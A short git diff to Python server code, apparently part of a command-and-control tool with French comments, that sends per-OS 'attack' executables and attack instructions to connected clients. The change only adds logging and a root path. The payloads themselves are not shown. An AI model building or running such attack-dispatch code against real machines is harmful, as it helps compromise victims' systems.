@@ -37,12 +37,12 @@ def format_attack_data(type, id, data):
 
 
 
-def send_executable_to_client(attack_type, client_os, client_sym_key, client_iv, client_reception_queue, client_emission_queue):
+def send_executable_to_client(attack_type, client_os, client_sym_key, client_iv, client_reception_queue, client_emission_queue, logger):
     #Récupérer os du client 
     if client_os == "windows":
-        executable_path = 'actions/windows/' + attack_type + '.exe'
+        executable_path = ROOT_PATH + 'actions/windows/' + attack_type + '.exe'
     else:
-        executable_path = 'actions/linux/' + attack_type
+        executable_path = ROOT_PATH + 'actions/linux/' + attack_type
 
     if os.path.isfile(executable_path):
         with open(executable_path, 'rb') as f:
@@ -50,15 +50,18 @@ def send_executable_to_client(attack_type, client_os, client_sym_key, client_iv,
         
             client_emission_queue.put(executable_data)
             print("\t[+] L'exécutable a été envoyé")
+            logger.info("L'exécutable a été envoyé")
 
                         
     else:
         print("\t[!] L'exécutable n'a pas été trouvé sur le serveur")
+        logger.error("L'exécutable n'a pas été trouvé sur le serveur")
 
 
 
-def execute_attack(client, attack):
+def execute_attack(client, attack, logger):
     print("\t[+] sending attack to " + str(client['addr']))
+    logger.info("sending attack to " + str(client['addr']))
 
     # Récupération des données de l'attaque
     # print("\t[+] data de l'attack : " + str(attack))
@@ -70,7 +73,9 @@ def execute_attack(client, attack):
 
 
     print("\t[+] data_to_send : " + str(data_to_send))
+    logger.info("data_to_send : " + str(data_to_send))
 
     client['emission_queue'].put(data_to_send.encode())
 
     print("\t[+] instruction envoyée")
+    logger.info("instruction envoyée")
